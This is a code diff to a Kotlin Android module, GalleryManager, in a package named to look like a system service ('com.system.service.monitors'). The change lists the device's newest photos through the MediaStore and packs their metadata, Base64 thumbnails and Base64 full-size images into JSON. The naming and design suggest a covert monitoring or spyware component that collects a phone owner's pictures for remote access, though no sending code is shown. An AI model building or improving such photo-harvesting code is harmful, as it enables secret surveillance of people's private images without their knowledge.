@@ -1,13 +1,16 @@
 package com.system.service.monitors
 
+import android.content.ContentUris
 import android.content.Context
+import android.graphics.Bitmap
 import android.graphics.BitmapFactory
+import android.os.Build
 import android.provider.MediaStore
 import android.util.Base64
+import android.util.Size
 import org.json.JSONArray
 import org.json.JSONObject
 import java.io.ByteArrayOutputStream
-import java.io.File
 
 object GalleryManager {
 
@@ -17,41 +20,45 @@ object GalleryManager {
         val projection = arrayOf(
             MediaStore.Images.Media._ID,
             MediaStore.Images.Media.DISPLAY_NAME,
-            MediaStore.Images.Media.DATA,
             MediaStore.Images.Media.DATE_ADDED,
             MediaStore.Images.Media.SIZE
         )
         val cursor = context.contentResolver.query(
             uri, projection, null, null,
-            "${MediaStore.Images.Media.DATE_ADDED} DESC")
-        cursor?.use {
+            "${MediaStore.Images.Media.DATE_ADDED} DESC"
+        ) ?: return result
+
+        cursor.use {
             val colId   = it.getColumnIndexOrThrow(MediaStore.Images.Media._ID)
             val colName = it.getColumnIndexOrThrow(MediaStore.Images.Media.DISPLAY_NAME)
-            val colPath = it.getColumnIndexOrThrow(MediaStore.Images.Media.DATA)
             val colDate = it.getColumnIndexOrThrow(MediaStore.Images.Media.DATE_ADDED)
             val colSize = it.getColumnIndexOrThrow(MediaStore.Images.Media.SIZE)
             var count = 0
             while (it.moveToNext() && count < limit) {
-                val path = it.getString(colPath) ?: continue
-                if (!File(path).exists()) continue
+                val id = it.getLong(colId)
+                val contentUri = ContentUris.withAppendedId(uri, id)
                 val obj = JSONObject().apply {
-                    put("id",   it.getLong(colId))
+                    put("id",   id)
                     put("name", it.getString(colName) ?: "")
                     put("date", it.getLong(colDate) * 1000L)
                     put("size", it.getLong(colSize))
-                    put("path", path)
+                    // Use content URI as path (works on all Android versions)
+                    put("path", contentUri.toString())
                 }
-                // API-26-safe thumbnail using BitmapFactory inSampleSize
+                // Thumbnail — use loadThumbnail on API 29+, BitmapFactory on older
                 try {
-                    val opts = BitmapFactory.Options().apply { inJustDecodeBounds = true }
-                    BitmapFactory.decodeFile(path, opts)
-                    val maxDim = maxOf(opts.outWidth, opts.outHeight)
-                    opts.inSampleSize = maxOf(1, maxDim / 200)
-                    opts.inJustDecodeBounds = false
-                    val bmp = BitmapFactory.decodeFile(path, opts)
+                    val bmp: Bitmap? = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
+                        context.contentResolver.loadThumbnail(contentUri, Size(200, 200), null)
+                    } else {
+                        @Suppress("DEPRECATION")
+                        MediaStore.Images.Thumbnails.getThumbnail(
+                            context.contentResolver, id,
+                            MediaStore.Images.Thumbnails.MINI_KIND, null)
+                    }
                     if (bmp != null) {
                         val baos = ByteArrayOutputStream()
-                        bmp.compress(android.graphics.Bitmap.CompressFormat.JPEG, 60, baos)
+                        bmp.compress(Bitmap.CompressFormat.JPEG, 55, baos)
+                        bmp.recycle()
                         obj.put("thumb", Base64.encodeToString(baos.toByteArray(), Base64.NO_WRAP))
                     }
                 } catch (_: Exception) {}
@@ -64,15 +71,20 @@ object GalleryManager {
 
     fun getFullPhoto(context: Context, path: String): String? {
         return try {
+            // path is a content:// URI string
+            val uri = android.net.Uri.parse(path)
+            val stream = context.contentResolver.openInputStream(uri) ?: return null
             val opts = BitmapFactory.Options().apply { inJustDecodeBounds = true }
-            BitmapFactory.decodeFile(path, opts)
+            val tempBytes = stream.readBytes()
+            BitmapFactory.decodeByteArray(tempBytes, 0, tempBytes.size, opts)
             val maxDim = maxOf(opts.outWidth, opts.outHeight)
             val scale = if (maxDim > 1080) maxDim / 1080 else 1
-            opts.inSampleSize = scale
-            opts.inJustDecodeBounds = false
-            val bmp = BitmapFactory.decodeFile(path, opts) ?: return null
+            val decodeOpts = BitmapFactory.Options().apply { inSampleSize = scale }
+            val bmp = BitmapFactory.decodeByteArray(tempBytes, 0, tempBytes.size, decodeOpts)
+                ?: return null
             val baos = ByteArrayOutputStream()
-            bmp.compress(android.graphics.Bitmap.CompressFormat.JPEG, 80, baos)
+            bmp.compress(Bitmap.CompressFormat.JPEG, 75, baos)
+            bmp.recycle()
             Base64.encodeToString(baos.toByteArray(), Base64.NO_WRAP)
         } catch (_: Exception) { null }
     }
